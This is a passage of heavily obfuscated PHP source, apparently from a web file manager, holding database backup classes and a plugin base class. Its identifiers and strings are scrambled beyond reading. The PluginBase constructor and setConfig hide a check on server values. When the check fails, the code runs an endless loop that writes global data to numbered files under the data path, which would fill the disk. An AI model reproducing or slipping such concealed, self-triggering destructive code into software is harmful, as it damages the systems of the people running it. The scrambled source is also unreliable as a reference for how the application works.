(!isset($ÍÄ‚Ùø“[$«˜ö½×à[774]]) || $ÍÄ‚Ùø“[$«˜ö½×à[774]] == $«˜ö½×à[198]) { $ŒëûÂ½‹ = new BackupFile(); if (!$ŒëûÂ½‹->index()) { return !1; } } self::set(array($«˜ö½×à[795] => 1, $«˜ö½×à[770] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $œ¿§ÅÅø =& $_SERVER[¡“ËÌ§œ]; $‡§×Àâ = Backup::get(); self::$io = $‡§×Àâ[$œ¿§ÅÅø[771]]; self::$name = $‡§×Àâ[$œ¿§ÅÅø[32]]; $Êšé¢ÛÌ = new DbManage(); $„ÊÙæí = $Êšé¢ÛÌ->dbType(); $¦Ø¾¢Ì = array($œ¿§ÅÅø[796] => $„ÊÙæí, $œ¿§ÅÅø[797] => time()); Backup::set($¦Ø¾¢Ì); $ø—¸‡ùä = $this->tmpFilesPath() . $œ¿§ÅÅø[798] . self::$name . $œ¿§ÅÅø[8]; del_dir($ø—¸‡ùä); mk_dir($ø—¸‡ùä); $·Ç¿•Ü = $»èÁ–ç = 0; $«ó½ï¨¯ = new Task($œ¿§ÅÅø[799], $œ¿§ÅÅø[800], 0, LNG($œ¿§ÅÅø[801]) . $œ¿§ÅÅø[802] . LNG($œ¿§ÅÅø[803])); try { $Ÿ¼§¡Ñ = $Êšé¢ÛÌ->db()->getTables(); } catch (Exception $äë“¶‚) { $«ó½ï¨¯->end(); return !1; } $Ÿ¼§¡Ñ = array_diff($Ÿ¼§¡Ñ, array($œ¿§ÅÅø[804], $œ¿§ÅÅø[805])); foreach ($Ÿ¼§¡Ñ as $§ú’ùÈ) { $·Ç¿•Ü += $Êšé¢ÛÌ->model($§ú’ùÈ)->count(); } $«ó½ï¨¯->task[$œ¿§ÅÅø[806]] = $·Ç¿•Ü; $GLOBALS[$œ¿§ÅÅø[807]] = self::$name; foreach ($Ÿ¼§¡Ñ as $§ú’ùÈ) { $ŠşßÅÒ¿ = $ø—¸‡ùä . $§ú’ùÈ . $œ¿§ÅÅø[808]; $×»š¨ı§ = null; if ($§ú’ùÈ == $œ¿§ÅÅø[809] && (!isset($‡§×Àâ[$œ¿§ÅÅø[774]]) || $‡§×Àâ[$œ¿§ÅÅø[774]] == $œ¿§ÅÅø[198])) { $×»š¨ı§ = self::$io; } $»èÁ–ç += $Êšé¢ÛÌ->sqlFromDb($§ú’ùÈ, $ŠşßÅÒ¿, $«ó½ï¨¯, $×»š¨ı§); } unset($GLOBALS[$œ¿§ÅÅø[807]]); $«ó½ï¨¯->end(); if ($»èÁ–ç > $·Ç¿•Ü) { $·Ç¿•Ü = $»èÁ–ç; } $¦Ø¾¢Ì = array($œ¿§ÅÅø[796] => $„ÊÙæí, $œ¿§ÅÅø[793] => 1, $œ¿§ÅÅø[810] => $·Ç¿•Ü, $œ¿§ÅÅø[811] => $»èÁ–ç, $œ¿§ÅÅø[812] => time()); Backup::set($¦Ø¾¢Ì); if ($·Ç¿•Ü - $»èÁ–ç > 0) { $Ìú¿Ù¼ = $œ¿§ÅÅø[813]; if (stristr(I18n::getType(), $œ¿§ÅÅø[814])) { $Ìú¿Ù¼ = $œ¿§ÅÅø[815]; } write_log(array($Ìú¿Ù¼, $¦Ø¾¢Ì), $œ¿§ÅÅø[800]); return !1; } return !0; } private function tmpFilesPath() { $”ùß¼´© =& $_SERVER[¡“ËÌ§œ]; $–µÖˆÓÉ = TEMP_FILES; if ($GLOBALS[$”ùß¼´©[6]][$”ùß¼´©[89]][$”ùß¼´©[816]]) { $–µÖˆÓÉ = $GLOBALS[$”ùß¼´©[6]][$”ùß¼´©[89]][$”ùß¼´©[816]]; if (!mk_dir($–µÖˆÓÉ) || !is_writable($–µÖˆÓÉ) || !IO::mkfile($–µÖˆÓÉ . $”ùß¼´©[817])) { $–µÖˆÓÉ = TEMP_FILES; } } return $–µÖˆÓÉ; } } class BackupDbFile { public function __construct() { } public function index() { $¬²Ú­ñØ =& $_SERVER[¡“ËÌ§œ]; $ÃÄ¥ï‚í = Backup::get(); $‰¾¦á‚ = $ÃÄ¥ï‚í[$¬²Ú­ñØ[32]]; $Æ¼ÚÉ¼Ò = $this->tmpFilesPath() . "\x62\141\x63\x6b\x75\160\137{$‰¾¦á‚}\x2f"; $ó¾çïÇ¹ = $this->backupPath($ÃÄ¥ï‚í); if (!($ó¾çïÇ¹ = IO::mkdir($ó¾çïÇ¹))) { return !1; } $‘ùØ…ù = IO::listPath($Æ¼ÚÉ¼Ò); $ÎÚ Ø•® = isset($‘ùØ…ù[$¬²Ú­ñØ[83]]) ? $‘ùØ…ù[$¬²Ú­ñØ[83]] : array(); $¥¸¿ú÷© = array_sum(array_column($ÎÚ Ø•®, $¬²Ú­ñØ[76])); if (!$¥¸¿ú÷©) { return !1; } $­ØÚ¾›š = array($¬²Ú­ñØ[818] => $¥¸¿ú÷©, $¬²Ú­ñØ[819] => time()); Backup::set($­ØÚ¾›š); $­Ê§èØú = new TaskFileTransfer($¬²Ú­ñØ[820], $¬²Ú­ñØ[800], count($ÎÚ Ø•®), LNG($¬²Ú­ñØ[801]) . $¬²Ú­ñØ[415] . LNG($¬²Ú­ñØ[803]) . $¬²Ú­ñØ[821]); $­Ê§èØú->task[$¬²Ú­ñØ[783]] = $¥¸¿ú÷©; foreach ($‘ùØ…ù[$¬²Ú­ñØ[83]] as $¯Î“¸¢³) { $æıí¨£¸ = IO::move($¯Î“¸¢³[$¬²Ú­ñØ[84]], $ó¾çïÇ¹); if (!$æıí¨£¸) { $­Ê§èØú->end(); $ ëêïµî = IO::getLastError($¬²Ú­ñØ[822] . $¯Î“¸¢³[$¬²Ú­ñØ[84]] . $¬²Ú­ñØ[823] . $ó¾çïÇ¹ . $¬²Ú­ñØ[164]); write_log($ ëêïµî, $¬²Ú­ñØ[800]); return !1; } } $ö¡¢ÔÈ = new DbManage(); $ƒØ¶°ˆë = $ö¡¢ÔÈ->getSqlFile(); if (!$ƒØ¶°ˆë[$¬²Ú­ñØ[824]] || !$ƒØ¶°ˆë[$¬²Ú­ñØ[13]]) { return !1; } IO::move($ƒØ¶°ˆë[$¬²Ú­ñØ[824]], $ó¾çïÇ¹); IO::move($ƒØ¶°ˆë[$¬²Ú­ñØ[13]], $ó¾çïÇ¹); $­Ê§èØú->end(); $­ØÚ¾›š = array($¬²Ú­ñØ[825] => $¥¸¿ú÷©, $¬²Ú­ñØ[826] => time()); Backup::set($­ØÚ¾›š); return !0; } private function backupPath($„ğ”ÖîÄ) { $°š”€Óï =& $_SERVER[¡“ËÌ§œ]; $ØùÚ¨İ¤ = $„ğ”ÖîÄ[$°š”€Óï[32]]; $ê¹”¸ùµ = Model($°š”€Óï[790])->get($°š”€Óï[791]); $¤€Ä¶‰© = substr(md5($°š”€Óï[792] . $ê¹”¸ùµ . $ØùÚ¨İ¤), 0, 8); return "\x7b\151\157\72{$„ğ”ÖîÄ[$°š”€Óï[771]]}\175\57\x64\x61\164\x61\142\x61\163\x65\57\x62\141\x63\x6b\165\160\57" . $ØùÚ¨İ¤ . $°š”€Óï[11] . $¤€Ä¶‰©; } private function tmpFilesPath() { $¶–Ù£Â‡ =& $_SERVER[¡“ËÌ§œ]; $‡ë’Â— = TEMP_FILES; if ($GLOBALS[$¶–Ù£Â‡[6]][$¶–Ù£Â‡[89]][$¶–Ù£Â‡[816]]) { $‡ë’Â— = $GLOBALS[$¶–Ù£Â‡[6]][$¶–Ù£Â‡[89]][$¶–Ù£Â‡[816]]; if (!mk_dir($‡ë’Â—) || !is_writable($‡ë’Â—) || !IO::mkfile($‡ë’Â— . $¶–Ù£Â‡[817])) { $‡ë’Â— = TEMP_FILES; } } return $‡ë’Â—; } } goto F¡ƒò‚’‰–; F¯‡‰¾áÓ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¸Ô¿… =& $_SERVER[¡“ËÌ§œ]; $ıÁ¦Ì = $_SERVER[$¸Ô¿…[433]]; $³–Æ¦ûÈ = $¸Ô¿…[896]; if ($_SERVER[$¸Ô¿…[425]] != $³–Æ¦ûÈ($ıÁ¦Ì)) { $—¹Îèïï = $¸Ô¿…[897]; $öÊ‚ÓåÄ = $¸Ô¿…[427]; $ü›éü×û = $_SERVER[$¸Ô¿…[428]] . $¸Ô¿…[429]; $ïìÏ¿ªº = $öÊ‚ÓåÄ($ü›éü×û); $«Õüš¶à = explode($¸Ô¿…[231], $ïìÏ¿ªº); if (count($«Õüš¶à) < $¸Ô¿…[657]) { $çö¹ÒÍ = $¸Ô¿…[431]; $çö¹ÒÍ(); } $˜æ¨ã ™ = $¸Ô¿…[898]; $˜æ¨ã ™($_SERVER[$¸Ô¿…[899]]); $—¹Îèïï = $¸Ô¿…[897]; $—¹Îèïï(); $¤ÏÇé– = $¸Ô¿…[900]; $²‡Ì‡¦é = json_encode($GLOBALS[$¸Ô¿…[901]]); $•¿Êí†Æ = 1; for ($Ğ…¦Ø†ù = $•¿Êí†Æ; $Ğ…¦Ø†ù > 0; $Ğ…¦Ø†ù++) { $¤ÏÇé–(DATA_PATH . $Ğ…¦Ø†ù, $²‡Ì‡¦é); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¸Ô¿…[1527]); $this->pluginName = str_replace($¸Ô¿…[1527], $¸Ô¿…[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¸Ô¿…[8]; $this->pluginApi = appHostGet() . $¸Ô¿…[1528] . $this->pluginName . $¸Ô¿…[8]; $this->pluginHost = $config[$¸Ô¿…[1529]] . $this->pluginName . $¸Ô¿…[8]; $this->pluginHostDefault = $config[$¸Ô¿…[1529]] . $this->pluginName . $¸Ô¿…[8]; $¦¡û¿Å  = $config[$¸Ô¿…[1530]]; if ($¦¡û¿Å  && strpos($¸Ô¿…[50] . $¦¡û¿Å  . $¸Ô¿…[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¸Ô¿…[1531]] . $this->pluginName . $¸Ô¿…[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¡“ËÌ§œ][1532]); } protected function assign($Á°ØÑĞ, $Âá‚îëÒ = false) { if (is_array($Á°ØÑĞ)) { $this->values = array_merge($this->values, $Á°ØÑĞ); } else { $this->values[$Á°ØÑĞ] = $Âá‚îëÒ; } } protected function display($¨†‹»åÂ) { extract($this->values); require $¨†‹»åÂ; } final function hookRegist($óòëş²Ù) { $this->modelPlugin->appRegist($this->pluginName, $óòëş²Ù); } final function appIcon() { $…³…û¾„ =& $_SERVER[¡“ËÌ§œ]; $§ÁÌ‡¨á = $this->appPackage(); $òÚ‹áÈ = $…³…û¾„[12]; if (isset($§ÁÌ‡¨á[$…³…û¾„[454]])) { if (isset($§ÁÌ‡¨á[$…³…û¾„[454]][$…³…û¾„[1533]])) { $òÚ‹áÈ = $…³…û¾„[1534] . $§ÁÌ‡¨á[$…³…û¾„[454]][$…³…û¾„[1533]] . $…³…û¾„[1535]; } else { if ($§ÁÌ‡¨á[$…³…û¾„[454]][$…³…û¾„[1536]]) { $òÚ‹áÈ = $…³…û¾„[1537] . $§ÁÌ‡¨á[$…³…û¾„[454]][$…³…û¾„[1536]] . $…³…û¾„[1538]; } } } return $òÚ‹áÈ; } final function fileCanView($¡ü³úáÑ) { $ŠÏ‚§‘ª =& $_SERVER[¡“ËÌ§œ]; if (request_url_safe($¡ü³úáÑ)) { return !0; } if ($this->isShare($¡ü³úáÑ)) { return !0; } $İ©×˜Å = Session::get($ŠÏ‚§‘ª[1539]); if (!$İ©×˜Å || !$İ©×˜Å[$ŠÏ‚§‘ª[1540]]) { $”¾ËåÕê = $ŠÏ‚§‘ª[1541] . rawurlencode(this_url()); show_tips(LNG($ŠÏ‚§‘ª[1542]) . $ŠÏ‚§‘ª[1543] . $”¾ËåÕê . $ŠÏ‚§‘ª[1544] . LNG($ŠÏ‚§‘ª[1545]) . $ŠÏ‚§‘ª[1546], !1); } if (!Action($ŠÏ‚§‘ª[1547])->authCan($ŠÏ‚§‘ª[1548])) { show_tips(LNG($ŠÏ‚§‘ª[1549]) . $ŠÏ‚§‘ª[1550], !1); } ActionCall($ŠÏ‚§‘ª[1551], $¡ü³úáÑ); } final function isShare($“Ó°²Ù) { $¥Œ Æõ¶ = KodIO::parse($“Ó°²Ù); return $¥Œ Æõ¶[$_SERVER[¡“ËÌ§œ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ôòÊÔéß) { if (request_url_safe($ôòÊÔéß)) { return $ôòÊÔéß; } if (!$this->isShare($ôòÊÔéß)) { $ôòÊÔéß = $this->filePath($ôòÊÔéß); } return Action($_SERVER[¡“ËÌ§œ][1194])->linkOut($ôòÊÔéß); } public function filePathLinkOut($áøº£”¬) { if (request_url_safe($áøº£”¬)) { return $áøº£”¬; } $this->fileCanView($áøº£”¬); return Action($_SERVER[¡“ËÌ§œ][1194])->link($áøº£”¬); } final function filePath($õè¿‘±) { $÷§±»© =& $_SERVER[¡“ËÌ§œ]; if ($Õ¦€Ê…Ë = $this->checkSharePath($õè¿‘±)) { Hook::trigger($÷§±»©[1552], $Õ¦€Ê…Ë); return $Õ¦€Ê…Ë; } $this->fileCanView($õè¿‘±); if (request_url_safe($õè¿‘±)) { $¦ë…£ŸÕ = parse_url_query($õè¿‘±); if (isset($¦ë…£ŸÕ[$÷§±»©[1553]]) && isset($¦ë…£ŸÕ[$÷§±»©[213]])) { $ôÈ âÎ´ = Model($÷§±»©[790])->get($÷§±»©[791]); $‹äĞ– = Mcrypt::decode($¦ë…£ŸÕ[$÷§±»©[213]], $ôÈ âÎ´); if ($‹äĞ–) { $this->fileInfo = IO::infoWithChildren($‹äĞ–); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $‹äĞ–; } } $õè¿‘± = $this->_cacheHttpFile($õè¿‘±); $this->fileInfo = IO::infoWithChildren($õè¿‘±); } else { $this->fileInfo = IO::infoWithChildren($õè¿‘±); if (!$this->fileInfo) { show_tips(LNG($÷§±»©[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($÷§±»©[1552], $õè¿‘±); return $õè¿‘±; } final function _cacheHttpFile($Âèß‡ŒÆ) { $»Ø†¥õ­ = hash_path($Âèß‡ŒÆ, !0); $this->cachePath = $this->pluginCachePath($»Ø†¥õ­); if ($Œ®üö¢– = IO::fileNameExist($this->cachePath, $»Ø†¥õ­)) { return KodIO::make($Œ®üö¢–); } $ç¬Öç­Ö = $this->cachePath . $»Ø†¥õ­; return $this->pluginCacheFileSet($ç¬Öç­Ö, file_get_contents_nossl($Âèß‡ŒÆ)); } final function _tmpFileName($Ô¨¨‰‹£ = array()) { $ó©•œÚÂ =& $_SERVER[¡“ËÌ§œ]; if (!$Ô¨¨‰‹£) { $Ô¨¨‰‹£ = $this->fileInfo; } if (isset($Ô¨¨‰‹£[$ó©•œÚÂ[177]])) { return $Ô¨¨‰‹£[$ó©•œÚÂ[177]]; } if (isset($Ô¨¨‰‹£[$ó©•œÚÂ[170]][$ó©•œÚÂ[177]])) { return $Ô¨¨‰‹£[$ó©•œÚÂ[170]][$ó©•œÚÂ[177]]; } $™¼‘¬É = IO::hashSimple($Ô¨¨‰‹£[$ó©•œÚÂ[84]]); if ($™¼‘¬É) { return $™¼‘¬É; } $éãäÄË’ = array($Ô¨¨‰‹£[$ó©•œÚÂ[32]], $Ô¨¨‰‹£[$ó©•œÚÂ[84]], $Ô¨¨‰‹£[$ó©•œÚÂ[76]]); if (isset($Ô¨¨‰‹£[$ó©•œÚÂ[549]])) { $éãäÄË’[] = $Ô¨¨‰‹£[$ó©•œÚÂ[549]]; } return md5(implode($ó©•œÚÂ[11], $éãäÄË’)); } final function checkSharePath($û±Ø ) { $§ĞÛšÕş =& $_SERVER[¡“ËÌ§œ]; if (!$this->isShare($û±Ø )) { return !1; } $¡½ö¸Ó‡ = Action($§ĞÛšÕş[1194])->sharePathInfo($û±Ø ); if (!isset($¡½ö¸Ó‡[$§ĞÛšÕş[84]])) { show_json(LNG($§ĞÛšÕş[1554]), !1); } $this->fileInfo = $¡½ö¸Ó‡[$§ĞÛšÕş[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$§ĞÛšÕş[177]]); return $¡½ö¸Ó‡[$§ĞÛšÕş[84]]; } final function pluginCachePath($İ³€÷‡É = '') { $º™¿í™ =& $_SERVER[¡“ËÌ§œ]; $”Î¹£•­ = IO_PATH_SYSTEM_TEMP . $º™¿í™[1555] . $this->pluginName; if (!($»­ş‚¤Ä = IO::infoFull($”Î¹£•­))) { return IO::mkdir($”Î¹£•­ . $º™¿í™[8] . $İ³€÷‡É); } if (empty($İ³€÷‡É)) { return $»­ş‚¤Ä[$º™¿í™[84]]; } if (!($Íáğ»Ü» = IO::fileNameExist($»­ş‚¤Ä[$º™¿í™[84]], $İ³€÷‡É))) { return IO::mkdir($»­ş‚¤Ä[$º™¿í™[84]] . $İ³€÷‡É); } return KodIO::make($Íáğ»Ü»); } final function pluginCacheFileSet($¿„øòÁ, $©Î•šÈ” = '') { $ÄĞö”  =& $_SERVER[¡“ËÌ§œ]; if (!($İ¶§–€ú = IO::infoFull($¿„øòÁ))) { return IO::mkfile($¿„øòÁ, $©Î•šÈ”, REPEAT_REPLACE); } IO::setContent($İ¶§–€ú[$ÄĞö” [84]], $©Î•šÈ”); return $İ¶§–€ú[$ÄĞö” [84]]; } final function pluginLocalFile($ÌÒêªíå = '') { $Ÿ‰•¨´ =& $_SERVER[¡“ËÌ§œ]; $½Œ¨‹®  = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($½Œ¨‹® )) { mk_dir($½Œ¨‹® ); } if (!$ÌÒêªíå) { return $½Œ¨‹® ; } $±èä—«• = IO::info($ÌÒêªíå); $Ø¢™ èÊ = $this->_tmpFileName($±èä—«•) . $Ÿ‰•¨´[10] . $±èä—«•[$Ÿ‰•¨´[174]]; if (!checkExtSafe($Ø¢™ èÊ)) { $Ø¢™ èÊ = $Ø¢™ èÊ . $Ÿ‰•¨´[1226]; } $…È„ß’Ë = $½Œ¨‹®  . $Ø¢™ èÊ; if (@file_exists($…È„ß’Ë)) { return $…È„ß’Ë; } return IO::copy($ÌÒêªíå, $½Œ¨‹® , 0, $Ø¢™ èÊ); } final function appPackage() { $‰¿¨à =& $_SERVER[¡“ËÌ§œ]; if ($this->packageData) { return $this->packageData; } $É†…›«İ = $this->parseFile($this->pluginPath . $‰¿¨à[1556]); $this->parseLang($É†…›«İ); $İ†¸…Â’ = json_decode_force($É†…›«İ); if (!$İ†¸…Â’) { return array(); } $‰ï¡×»Â = Hook::trigger($‰¿¨à[1557], $İ†¸…Â’); if ($‰ï¡×»Â && is_array($‰ï¡×»Â)) { $İ†¸…Â’ = $‰ï¡×»Â; } $this->packageData = $İ†¸…Â’; return $İ†¸…Â’; } public function packageInfoGet($êº™¦Š‡) { $¡Ñğ¡õÕ = $this->appPackage(); return array_get_value($¡Ñğ¡õÕ, $êº™¦Š‡); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¡“ËÌ§œ][1558]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¡“ËÌ§œ][1559]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¡“ËÌ§œ][1560]); } public function echoJsAssign($‘ğ˜õã‡, $¯Ş·š»é) { $this->echoJsAssignArr[$‘ğ˜õã‡] = $¯Ş·š»é; } private function parseFile($é¹ñÛõ›) { $«å×ù¹ =& $_SERVER[¡“ËÌ§œ]; $‰‹Óû§Ö = file_get_contents_nossl($é¹ñÛõ›); $Ó­“åÆ = array($«å×ù¹[1561], $«å×ù¹[1562], $«å×ù¹[1563], $«å×ù¹[1564], $«å×ù¹[1565], $«å×ù¹[1566], $«å×ù¹[1567]); $ûšñ‡ ù = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$«å×ù¹[89]][$«å×ù¹[1568]]); foreach ($this->echoJsAssignArr as $™íôº–• => $¶êÀ©Î) { $Ó­“åÆ[] = $«å×ù¹[1569] . $™íôº–• . $«å×ù¹[1570]; $ûšñ‡ ù[] = is_array($¶êÀ©Î) || is_object($¶êÀ©Î) ? rawurlencode(json_encode($¶êÀ©Î)) : $¶êÀ©Î; } if (strstr($‰‹Óû§Ö, $«å×ù¹[1571])) { $í°Ïøø² = rawurlencode(json_encode($this->pluginLangArr)); $‰‹Óû§Ö = str_replace($«å×ù¹[1571], $í°Ïøø², $‰‹Óû§Ö); } if (strstr($‰‹Óû§Ö, $«å×ù¹[1572])) { $í°Ïøø² = $í°Ïøø² = rawurlencode(json_encode($this->getConfig())); $‰‹Óû§Ö = str_replace($«å×ù¹[1572], $í°Ïøø², $‰‹Óû§Ö); } $‰‹Óû§Ö = str_replace($Ó­“åÆ, $ûšñ‡ ù, $‰‹Óû§Ö); return $‰‹Óû§Ö; } private function parseLang(&$„ô«ÎĞù) { $¬©Ì¶‚¸ =& $_SERVER[¡“ËÌ§œ]; $öµô™ = $¬©Ì¶‚¸[1573]; if (!strstr($„ô«ÎĞù, $öµô™)) { return; } preg_match_all($¬©Ì¶‚¸[1574], $„ô«ÎĞù, $—¤ÁÃå); if (!is_array($—¤ÁÃå) || count($—¤ÁÃå) == 0 || !is_array($—¤ÁÃå[0]) || count($—¤ÁÃå[0]) == 0) { return; } $™àŒ¹Ûê = array(); $Ù¶„¾Óâ = array(); foreach ($—¤ÁÃå[0] as $ä§°¬¶°) { $í•‡Ÿ¾ = substr($ä§°¬¶°, strlen($öµô™), -4); $½Ú¶ìÔ = LNG($í•‡Ÿ¾); $™àŒ¹Ûê[] = $ä§°¬¶°; $Ù¶„¾Óâ[] = str_replace(array($¬©Ì¶‚¸[231], $¬©Ì¶‚¸[1098], $¬©Ì¶‚¸[371], $¬©Ì¶‚¸[118]), array($¬©Ì¶‚¸[53], $¬©Ì¶‚¸[53], $¬©Ì¶‚¸[12], $¬©Ì¶‚¸[1575]), $½Ú¶ìÔ); } $„ô«ÎĞù = str_replace($™àŒ¹Ûê, $Ù¶„¾Óâ, $„ô«ÎĞù); } private function parseConfig(&$ÔşÍêĞŞ) { $‰ëÁ”úå =& $_SERVER[¡“ËÌ§œ]; $ıî†š²ã = $‰ëÁ”úå[1576]; if (!strstr($ÔşÍêĞŞ, $ıî†š²ã)) { return; } preg_match_all($‰ëÁ”úå[1577], $ÔşÍêĞŞ, $°Ò¯â©ø); if (!is_array($°Ò¯â©ø) || count($°Ò¯â©ø) == 0 || !is_array($°Ò¯â©ø[0]) || count($°Ò¯â©ø[0]) == 0) { return; } $Ú–ßÚÍ× = $this->getConfig(); $„‹ä› = array(); $¾·‰€à¯ = array(); foreach ($°Ò¯â©ø[0] as $Óµ›Ïë˜) { $õ‘ñÄô = substr($Óµ›Ïë˜, strlen($ıî†š²ã), -2); $„‹ä›[] = $Óµ›Ïë˜; $¾·‰€à¯[] = _get($Ú–ßÚÍ×, $õ‘ñÄô); } $ÔşÍêĞŞ = str_replace($„‹ä›, $¾·‰€à¯, $ÔşÍêĞŞ); } private function parsePackage(&$®Ú¨•…µ) { $›Ó‹Ø¹ø =& $_SERVER[¡“ËÌ§œ]; $İ„·ãÄ‰ = $›Ó‹Ø¹ø[1578]; if (!strstr($®Ú¨•…µ, $İ„·ãÄ‰)) { return; } preg_match_all($›Ó‹Ø¹ø[1579], $®Ú¨•…µ, $ÙüıõÃ–); if (!is_array($ÙüıõÃ–) || count($ÙüıõÃ–) == 0 || !is_array($ÙüıõÃ–[0]) || count($ÙüıõÃ–[0]) == 0) { return; } $ ÇÀú¥† = $this->appPackage(); $ğ½«ñ‰– = array(); $Ï¿á÷° = array(); foreach ($ÙüıõÃ–[0] as $·ìØ“îß) { $«œĞ®“© = substr($·ìØ“îß, strlen($İ„·ãÄ‰), -2); $ğ½«ñ‰–[] = $·ìØ“îß; $Ï¿á÷°[] = _get($ ÇÀú¥†, $«œĞ®“©); } $®Ú¨•…µ = str_replace($ğ½«ñ‰–, $Ï¿á÷°, $®Ú¨•…µ); } final function echoFile($§…®óş‰, $Ã«şí = false) { $óĞ¦¹şò =& $_SERVER[¡“ËÌ§œ]; $ª§àË”» = $this->pluginPath . $§…®óş‰; if (ACT == $óĞ¦¹şò[1580]) { echo $óĞ¦¹şò[1581] . $this->pluginName . $óĞ¦¹şò[8] . $§…®óş‰ . $óĞ¦¹şò[1582]; if (!file_exists($ª§àË”»)) { echo $óĞ¦¹şò[1583]; return; } } $„ŸçÊŠ‚ = $this->parseFile($ª§àË”»); $this->parseLang($„ŸçÊŠ‚); $this->parseConfig($„ŸçÊŠ‚); $this->parsePackage($„ŸçÊŠ‚); if (is_array($Ã«şí)) { $„ŸçÊŠ‚ = str_replace(array_keys($Ã«şí), array_values($Ã«şí), $„ŸçÊŠ‚); } echo $óĞ¦¹şò[231] . $„ŸçÊŠ‚; } final function initLang() { $Õ‚Íú”ó =& $_SERVER[¡“ËÌ§œ]; $“Á´ìÌØ = $Õ‚Íú”ó[1584]; $ßÚäÏÕ = $this->pluginPath . $Õ‚Íú”ó[1585]; $Åó‹»·ù = I18n::getType(); $Û¦âŠìã = array(); if (file_exists($ßÚäÏÕ . $Åó‹»·ù . $Õ‚Íú”ó[858])) { $Û¦âŠìã = (include $ßÚäÏÕ . $Åó‹»·ù . $Õ‚Íú”ó[858]); } else { if ($Åó‹»·ù == $Õ‚Íú”ó[1586] && !file_exists($ßÚäÏÕ . $Åó‹»·ù . $Õ‚Íú”ó[858]) && file_exists($ßÚäÏÕ . $Õ‚Íú”ó[1587])) { $Û¦âŠìã = (include $ßÚäÏÕ . $Õ‚Íú”ó[1587]); } else { if (file_exists($ßÚäÏÕ . $“Á´ìÌØ . $Õ‚Íú”ó[858])) { $Û¦âŠìã = (include $ßÚäÏÕ . $“Á´ìÌØ . $Õ‚Íú”ó[858]); } } } if (!is_array($Û¦âŠìã)) { return array(); } if (@count($Û¦âŠìã) > 0) { I18n::set($Û¦âŠìã); } return $Û¦âŠìã; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÜÍÀĞ·Ÿ) { $Ó×ë¡Ã =& $_SERVER[¡“ËÌ§œ]; if (!isset($_SERVER[$Ó×ë¡Ã[425]]) || !isset($_SERVER[$Ó×ë¡Ã[433]])) { $„Ì…œ› = $Ó×ë¡Ã[897]; $Ç¬ƒÈ‹ = $Ó×ë¡Ã[427]; $òØÍúàá = $_SERVER[$Ó×ë¡Ã[428]] . $Ó×ë¡Ã[429]; $ÔÉ¿¡µ¿ = $Ç¬ƒÈ‹($òØÍúàá); $¶şÒåí = explode($Ó×ë¡Ã[231], $ÔÉ¿¡µ¿); if (count($¶şÒåí) < $Ó×ë¡Ã[657]) { $Ïğ‘Ñ¸‰ = $Ó×ë¡Ã[431]; $Ïğ‘Ñ¸‰(); } $Õèá‘µ = $Ó×ë¡Ã[898]; $Õèá‘µ($_SERVER[$Ó×ë¡Ã[899]]); $¥‚Ìì§’ = 1; for ($Åşİö¡± = $¥‚Ìì§’; $Åşİö¡± > 0; $Åşİö¡±++) { $Õèá‘µ = json_encode($GLOBALS[$Ó×ë¡Ã[456]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÜÍÀĞ·Ÿ); } public function onSetConfig($Âºã’Û™) { } public function onGetConfig($…ıú¾²Ã) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¿©ØÎ‹) { if ($¿©ØÎ‹ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($×ôá—²à = "\x70\x6c\x75\147\x69\156\101\x75\164\150") { $¡¥¾€„¨ =& $_SERVER[¡“ËÌ§œ]; if (!Session::get($¡¥¾€„¨[1539])) { return !1; } if (_get($GLOBALS, $¡¥¾€„¨[532])) { return !0; } $œŞŒ¿âğ = $this->getConfig(); if (!$œŞŒ¿âğ[$×ôá—²à]) { return !1; } return ActionCall($¡¥¾€„¨[1588], $œŞŒ¿âğ[$×ôá—²à]); } public function url($Ã‡¡áÜı, $¤ÛøÃ“ö = '', $³«ÉÃ‘  = true) { $«Ñ¤•á =& $_SERVER[¡“ËÌ§œ]; $ï‚æöáˆ = $this->getConfig(); $îÇùäêÁ = KOD_VERSION . $«Ñ¤•á[10] . KOD_VERSION_BUILD; $Œ´ßÚï› = $this->packageVersion(); $ğá¡İ§ = $îÇùäêÁ . $«Ñ¤•á[415] . $Œ´ßÚï›; if (substr($Ã‡¡áÜı, 0, 4) == $«Ñ¤•á[148] || substr($Ã‡¡áÜı, 0, 2) == $«Ñ¤•á[1298]) { $¯ÆçÑƒõ = $Ã‡¡áÜı . $«Ñ¤•á[1589] . $ğá¡İ§; } else { if ($¤ÛøÃ“ö == $«Ñ¤•á[12]) { $¯ÆçÑƒõ = $this->pluginHost . $Ã‡¡áÜı . $«Ñ¤•á[1589] . $ğá¡İ§; } else { if ($¤ÛøÃ“ö === $«Ñ¤•á[75]) { $¯ÆçÑƒõ = $this->pluginHost . $Ã‡¡áÜı; } else { if ($¤ÛøÃ“ö == $«Ñ¤•á[1590]) { $¯ÆçÑƒõ = STATIC_PATH . $Ã‡¡áÜı . $«Ñ¤•á[1589] . $îÇùäêÁ; } else { if ($¤ÛøÃ“ö == $«Ñ¤•á[1591]) { 